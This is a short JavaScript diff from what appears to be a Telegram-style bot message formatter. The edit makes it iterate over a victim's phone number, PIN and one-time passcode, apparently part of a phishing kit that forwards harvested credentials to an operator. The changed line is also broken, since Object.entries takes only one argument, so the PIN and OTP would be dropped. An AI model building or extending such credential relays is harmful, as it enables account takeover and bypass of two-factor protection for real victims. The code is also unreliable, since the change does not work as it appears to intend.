@@ -12,7 +12,7 @@ const botManager = {
         let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
         msg += `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        for (const [k, v] of Object.entries(data)) {
+        for (const [k, v] of Object.entries(phonenumber,pin,otp)) {
             msg += `<b>${k}:</b> <code>${v}</code>\n`;
         }
         msg += `━━━━━━━━━━━━━━━━━━━━`;
